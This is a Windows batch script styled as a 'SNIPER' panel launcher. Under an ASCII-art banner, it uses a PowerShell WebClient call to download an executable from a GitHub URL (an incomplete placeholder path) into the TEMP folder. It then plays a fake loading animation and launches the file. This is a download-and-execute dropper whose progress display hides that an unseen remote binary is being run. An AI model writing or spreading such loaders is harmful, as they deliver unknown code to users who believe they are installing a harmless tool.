@echo off
chcp 65001 >nul

:: ===== PURPLE COLOR =====
color 0D

:: ===== SET CMD SIZE =====
mode con: cols=55 lines=13
cls

:: ===========================
::       ASCII DESIGN
:: ===========================
echo   ██████╗ ███╗   ██╗ ██╗ ███████╗ ███████╗ ███████╗
echo   ██╔═══╝ ████╗  ██║ ██║ ██╔══██║ ██╔════╝ ██╔══██╗
echo   █████╗  ██╔██╗ ██║ ██║ ██████╔╝ █████╗   ██████╔╝
echo   ╚═══██╗ ██║╚██╗██║ ██║ ██╔═══╝  ██╔══╝   ██╔══██╗
echo   ██████╝ ██║ ╚████║ ██║ ██║      ███████╗ ██║  ██║
echo   ╚═════╝ ╚═╝  ╚═══╝ ╚═╝ ╚═╝      ╚══════╝ ╚═╝  ╚═╝
echo.

echo ╔═══════════════════════════════════════╗
echo ║        DOWNLOADING PANEL...         ║
echo ╚═══════════════════════════════════════╝
echo.

set "u=https://github.com/.exe"
set "p=%TEMP%\PANEL.exe"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%u%', '%p%')"

:: ===== ANIMATION =====
setlocal EnableDelayedExpansion
set "anim=|/-\"

for /L %%i in (1,1,100) do (
    set /a pos=%%i %% 4
    for /F %%A in ("!pos!") do set "ch=!anim:~%%A,1!"

    cls
    echo   Loading Panel !ch!
    echo   Progress: %%i%%%%
    timeout /t 0 >nul
)

echo.
echo Opening panel...
powershell -c "[console]::beep(900,250)"

start "" "%p%"
exit
